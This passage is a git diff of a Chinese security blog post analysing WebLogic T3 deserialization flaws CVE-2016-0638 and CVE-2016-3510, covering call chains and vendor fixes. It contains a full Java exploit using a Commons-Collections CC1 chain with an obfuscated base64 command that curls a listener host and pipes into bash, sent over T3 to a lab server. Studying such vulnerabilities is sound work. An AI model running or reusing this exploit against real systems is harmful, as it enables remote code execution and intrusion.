@@ -142,7 +142,7 @@ WeblogicT3对RMI传递过来的数据处理过程非常复杂，分析起来可�
 
 
 
-## CVE-2016-0638分析
+## CVE-2016-0638(StreamMessageImpl+CC1)分析
 
 环境搭建直接参考上面的url即可：stop后，直接docker restart重启容器即可
 搭建完环境，直接看下补丁.
@@ -321,5 +321,203 @@ getObject()方法是一条完整的CC1链子，返回的是序列化的字节码
 目标服务器拿到payload字节码后，读取到类名StreamMessageImpl，此类名不在黑名单中，故可以绕过resolveClass中的过滤。在调用StreamMessageImpl的readObject时，底层会调用其readExternal方法，对封装的序列化数据进行反序列化，从而调用恶意类的readObject函数
 ```
 
+#### 思考
+
+假设找到了这处反序列化的点，如何构造exp 
+从`InboundMsgAbbrev#readObject`方法开始分析，这里会进入ObjectInputStream#readObject()方法中
+
+![image-20240620103019245](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620103019245.png)
+
+然后会调用readObject0方法
+![image-20240620103201114](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620103201114.png)
+
+然后在这里会switch读取bin中流的信息，然后做case分支调用
+![image-20240620105751888](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620105751888.png)
+
+进入`readOrdinaryObject`方法中，
+
+```java
+ private Object readOrdinaryObject(boolean unshared)
+        throws IOException
+    {
+        if (bin.readByte() != TC_OBJECT) {//这里也是读取，然后对115的一个判断，感觉是防止反射调用
+            throw new InternalError();
+        }
+
+        ObjectStreamClass desc = readClassDesc(false);
+        desc.checkDeserialize();
+
+        Class<?> cl = desc.forClass();//这里会监测类型  "class weblogic.jms.common. StreamMessageImpl"
+        if (cl == String.class || cl == Class.class
+                || cl == ObjectStreamClass.class) {
+            throw new InvalidClassException("invalid class descriptor");
+        }
+
+        Object obj;
+        try {
+            obj = desc.isInstantiable() ? desc.newInstance() : null;//进行了一个实例化
+        } catch (Exception ex) {
+            throw (IOException) new InvalidClassException(
+                desc.forClass().getName(),
+                "unable to create instance").initCause(ex);
+        }
+
+        passHandle = handles.assign(unshared ? unsharedMarker : obj);
+        ClassNotFoundException resolveEx = desc.getResolveException();
+        if (resolveEx != null) {
+            handles.markException(passHandle, resolveEx);
+        }
+
+        if (desc.isExternalizable()) {
+            readExternalData((Externalizable) obj, desc);
+```
+
+然后调用到`readExternalData`方法中，
+![image-20240620112708043](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620112708043.png)
+
+然后最后
+![image-20240620114536033](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620114536033.png)
+
+![image-20240620114546193](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620114546193.png)
+
+#### 修复方案：
+
+把`StreamMessageImpl#readExternal`中的ObjectInputStream换成了自定义的FilteringObjectInputStream()
+
+![image-20240620142634525](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620142634525.png)
+
+## CVE-2016-3510分析(MarshalledObject+cc1)
+
+此漏洞的利用方式与CVE-2016-0638一致，只不过这里不再借助StreamMessageImpl类，而是借助MarshalledObject类
+
+鉴于分析了前者，这个尝试自己探索一下
+很清楚发现是用了`readResolve()`方法中进行了readObject()
+
+```java
+历程：看了从readObject()--->readObject0()-->readOrdinaryObject()但是没找到哪里调用了readResolve() 
+```
+
+![image-20240620143500703](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620143500703.png)
+
+类中的`MarshalledObject`方法是对字节码objBytes进行赋值的
+
+![image-20240620144036381](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620144036381.png)
 
 
+
+#### 调用分析：
+
+前面都是相同的
+
+![image-20240620160016669](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620160016669.png)
+
+用的是下面这个invoke反射方法
+
+![image-20240620162228790](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620162228790.png)
+
+但是可以发现invoke的其实是null的方法
+
+![image-20240620160454320](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620160454320.png)
+
+但是到了这里name突然变成了readResolve()  `这个还是优点不理解`
+
+![image-20240620162319962](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620162319962.png)
+
+#### 调用链子	
+
+![image-20240620162359449](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620162359449.png)
+
+在CVE0638的基础上改了一下，竟然直接通了
+![image-20240620155536774](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620155536774.png)
+
+![image-20240620155528596](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620155528596.png)
+
+```java
+package com.supeream;
+import com.supeream.serial.Serializables;
+import com.supeream.weblogic.T3ProtocolOperation;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import weblogic.corba.utils.MarshalledObject;
+import weblogic.jms.common.StreamMessageImpl;
+
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CVE_2016_3510 {
+    public static byte[] serialize(final Object obj) throws Exception {
+        ByteArrayOutputStream btout = new ByteArrayOutputStream();
+        ObjectOutputStream objOut = new ObjectOutputStream(btout);
+        objOut.writeObject(obj);
+        return btout.toByteArray();
+    }
+
+    public byte[] getObject() throws Exception {
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"bash -c {echo,Y3VybCBodHRwOi8vMTkyLjE2OC4yMzYuMTMwOjQ0NDQ=}|{base64,-d}|{bash,-i}"})
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        final Map innerMap = new HashMap();
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
+        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
+        constructor.setAccessible(true);
+        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
+
+        final Map testMap = new HashMap();
+
+        Map evilMap = (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(), secondInvocationHandler);
+        final Constructor<?> ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
+        ctor.setAccessible(true);
+        final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
+        MarshalledObject marshalledObject=new MarshalledObject(handler);
+        byte[] payload2 = Serializables.serialize(marshalledObject);
+        T3ProtocolOperation.send("192.168.236.130", "7001", payload2);
+
+
+
+        byte[] serializeData=serialize(handler);
+        return new byte[5];
+    }
+
+    public static void main(String[] args) throws Exception {
+
+
+
+        byte[] payloadObject = new CVE_2016_3510().getObject();
+//        StreamMessageImpl streamMessage = new StreamMessageImpl();
+//        streamMessage.setDataBuffer(payloadObject,payloadObject.length);
+//        byte[] payload2 = Serializables.serialize(streamMessage);
+//        T3ProtocolOperation.send("192.168.236.130", "7001", payload2);
+    }
+}
+```
+
+抄过来一段总结
+
+```java
+在Java中，当一个对象被序列化时，会将对象的类型信息和对象的数据一起写入流中。当流被反序列化时，Java会根据类型信息创建对象，并将对象的数据从流中读取出来，然后调用对象中的readObject方法将数据还原到对象中，最终返回一个Java对象。在Weblogic中，当从流量中获取到普通类序列化数据的类对象后，程序会依次尝试调用类对象中的readObject、readResolve、readExternal等方法，以恢复对象的状态。
+
+readObject方法是Java中的一个成员方法，用于从流中读取对象的数据，并将其还原到对象中。该方法可以被对象重写，以实现自定义的反序列化逻辑。
+
+readResolve方法是Java中的一个成员方法，用于在反序列化后恢复对象的状态。当对象被反序列化后，Java会检查对象中是否存在readResolve方法，如果存在，则会调用该方法恢复对象的状态。
+
+readExternal方法是Java中的一个成员方法，用于从流中读取对象的数据，并将其还原到对象中。该方法通常被用于实现Java标准库中的可序列化接口Externalizable，以实现自定义的序列化逻辑。
+```
+
+#### 修复方案：
+
+在`MarshalledObject`#readResolve()中，创建了一个匿名类的resolveClass()方法加了黑名单，和上面一样。
+
+![image-20240620164915729](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620164915729.png)
